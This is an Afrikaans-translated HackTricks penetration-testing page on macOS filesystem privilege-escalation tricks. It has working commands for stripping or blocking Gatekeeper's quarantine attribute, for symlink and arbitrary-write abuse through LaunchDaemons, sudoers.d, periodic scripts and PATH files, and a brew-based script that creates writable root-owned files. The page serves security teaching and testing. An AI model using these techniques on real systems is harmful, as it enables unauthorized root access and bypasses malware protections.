# macOS FS Truuks

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## POSIX-toestemmingskombinasies

Toestemmings in 'n **gids**:

* **lees** - jy kan die gidsinskrywings **opsom**
* **skryf** - jy kan **lêers skryf/verwyder** in die gids en jy kan **leë mappe verwyder**.
* Maar jy **kan nie nie-leë mappe verwyder/wysig** tensy jy skryftoestemmings daaroor het nie.
* Jy **kan nie die naam van 'n map wysig** tensy jy dit besit nie.
* **uitvoer** - jy is **toegelaat om deur** die gids te beweeg - as jy nie hierdie reg het nie, kan jy nie enige lêers daarin, of in enige subgidse, toegang nie.

### Gevaarlike Kombinasies

**Hoe om 'n lêer/map wat deur root besit word te oorskryf**, maar:

* Een ouer **gids eienaar** in die pad is die gebruiker
* Een ouer **gids eienaar** in die pad is 'n **gebruikersgroep** met **skryftoegang**
* 'n Gebruikers **groep** het **skryf** toegang tot die **lêer**

Met enige van die vorige kombinasies kan 'n aanvaller 'n **sym/hard skakel** inspuit na die verwagte pad om 'n bevoorregte willekeurige skryf te verkry.

### Gidsroet R+X Spesiale geval

As daar lêers in 'n **gids** is waar **slegs root R+X-toegang het**, is daardie lêers **nie toeganklik vir enigiemand anders nie**. Dus kan 'n kwesbaarheid wat toelaat om 'n lêer leesbaar deur 'n gebruiker te **skuif**, wat nie gelees kan word as gevolg van daardie **beperking**, van hierdie gids **na 'n ander een**, misbruik word om hierdie lêers te lees.

Voorbeeld in: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Simboliese Skakel / Harde Skakel

As 'n bevoorregte proses data in 'n **lêer** skryf wat deur 'n **laer bevoorregte gebruiker** beheer kan word, of wat deur 'n laer bevoorregte gebruiker **vooraf geskep** kan word. Die gebruiker kan dit net **na 'n ander lêer wys** via 'n Simboliese of Harde skakel, en die bevoorregte proses sal op daardie lêer skryf.

Kyk na die ander afdelings waar 'n aanvaller 'n willekeurige skryf kan misbruik om voorregte te eskaleer.

## .fileloc

Lêers met die **`.fileloc`** uitbreiding kan na ander toepassings of binêre lêers wys sodat wanneer hulle oopgemaak word, die toepassing/binêre lêer uitgevoer sal word.\
Voorbeeld:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Willekeurige FD

As jy 'n **proses kan laat 'n lêer of 'n vouer met hoë voorregte oopmaak**, kan jy **`crontab`** misbruik om 'n lêer in `/etc/sudoers.d` met **`EDITOR=exploit.py`** oop te maak, sodat die `exploit.py` die FD na die lêer binne `/etc/sudoers` sal kry en dit kan misbruik.

Byvoorbeeld: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Vermy kwarantyn xattrs truuks

### Verwyder dit
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable vlag

Indien 'n lêer / vouer hierdie onveranderlike eienskap het, sal dit nie moontlik wees om 'n xattr daarop te plaas nie.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs berg

'n **devfs** berg **ondersteun nie xattr nie**, meer inligting in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### skryfextattr ACL

Hierdie ACL voorkom dat `xattrs` by die lêer gevoeg word
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble**-lêerformaat kopieer 'n lêer saam met sy ACE's.

In die [**bronkode**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) is dit moontlik om te sien dat die ACL-teksverteenwoordiging wat binne die xattr genoem word **`com.apple.acl.text`** gestoor word, as ACL in die gedekomprimeerde lêer ingestel gaan word. Dus, as jy 'n aansoek in 'n zip-lêer met die **AppleDouble**-lêerformaat saam met 'n ACL wat voorkom dat ander xattrs daarin geskryf word, saamgedruk het... die karantyn-xattr is nie in die aansoek ingestel nie:

Kyk na die [**oorspronklike verslag**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) vir meer inligting.

Om dit te dupliseer, moet ons eers die korrekte acl-string kry:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Moenie vergeet dat selfs as dit werk, die sandboks skryf die karantyn xattr voor)

Nie regtig nodig nie, maar ek los dit daar net in geval:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Bypass Kodehandtekeninge

Bundles bevat die lêer **`_CodeSignature/CodeResources`** wat die **hash** van elke enkele **lêer** in die **bundle** bevat. Let daarop dat die hash van CodeResources ook **ingebou is in die uitvoerbare lêer**, so ons kan nie daarmee mors nie.

Daar is egter sommige lêers waarvan die handtekening nie nagegaan sal word nie, hierdie het die sleutel uitgesluit in die plist, soos:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Dit is moontlik om die handtekening van 'n hulpbron van die opdraggelynpunt te bereken met:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Monteer dmgs

'n Gebruiker kan 'n aangepaste dmg selfs bo-op bestaande lêers monteer. Dit is hoe jy 'n aangepaste dmg-pakket met aangepaste inhoud kan skep:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## Willekeurige Skryfaksies

### Periodieke sh-skripte

As jou skripsie geïnterpreteer kan word as 'n **shell-skripsie** kan jy die **`/etc/periodic/daily/999.local`** shell-skripsie oorskryf wat elke dag geaktiveer sal word.

Jy kan 'n **nep** uitvoering van hierdie skripsie maak met: **`sudo periodic daily`**

### Daemons

Skryf 'n willekeurige **LaunchDaemon** soos **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** met 'n plist wat 'n willekeurige skripsie uitvoer soos:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### Genereer die skrip `/Applications/Scripts/privesc.sh` met die **opdragte** wat jy as root wil hardloop.

### Sudoers-lêer

As jy **willekeurige skryfregte** het, kan jy 'n lêer binne die vouer **`/etc/sudoers.d/`** skep wat jou **sudo**-bevoegdhede gee.

### PAD-lêers

Die lêer **`/etc/paths`** is een van die hoofplekke wat die PAD-omgewingsveranderlike populeer. Jy moet root wees om dit te oorskryf, maar as 'n skrip van 'n **bevoorregte proses** 'n **opdrag sonder die volledige pad** uitvoer, kan jy dit dalk **kaap** deur hierdie lêer te wysig.

Jy kan ook lêers skryf in **`/etc/paths.d`** om nuwe vouers in die `PAD`-omgewingsveranderlike te laai.

## Genereer skryfbare lêers as ander gebruikers

Dit sal 'n lêer genereer wat aan root behoort en deur my geskryf kan word ([**kode vanaf hier**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Dit kan ook werk as 'n privesc:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## Verwysings

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag. 

</details>
